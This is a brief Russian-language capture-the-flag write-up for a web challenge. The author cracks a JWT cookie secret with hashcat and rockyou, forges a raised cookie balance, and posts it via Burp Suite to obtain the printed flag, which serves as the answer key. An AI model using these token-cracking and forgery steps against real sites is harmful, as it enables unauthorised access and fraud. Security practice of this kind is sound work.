# Разведка 
На главной странице главное понимать, что нам сразу выдают cookie
```js
<script>
	fetch("/get_cookie")
</script>
```
Анализ cookie
```txt
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "user_cookie_balance": 0
}
```
Также перед этим провел разветку директорий с помощью, но ничего интересного не нашел
```url
 dirsearch -u https://ctyzdvhk.i.cdctf.net/ -x 503
```
# Подделка cookie

Подделка cookie это первое, что пришло на ум.
Попробуем подобрать jwt секрет
```bash
hashcat -m 16500 jwt.txt ~/Work/dict/rockyou.txt
```
В итоге получилось подобрать секрет
```txt
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2Nvb2tpZV9iYWxhbmNlIjowfQ.tZeCDGDWQMirKqWJ3tx3r4rmxSaFTPmOqFgU-Koq8Xg:COOKIEMONSTER
```

Дальше с помощью jwt.io меняем значения user_cookie_balance и получаем новую cookie.
Переходим в BurpSuite и вставляем новую cookie и получаем флаг.
POST /purchase_flag HTTP/2
# Flag
```html
	<p>cdctf{0mNomN0mNomC00k1E5!_58626142}</p>
```
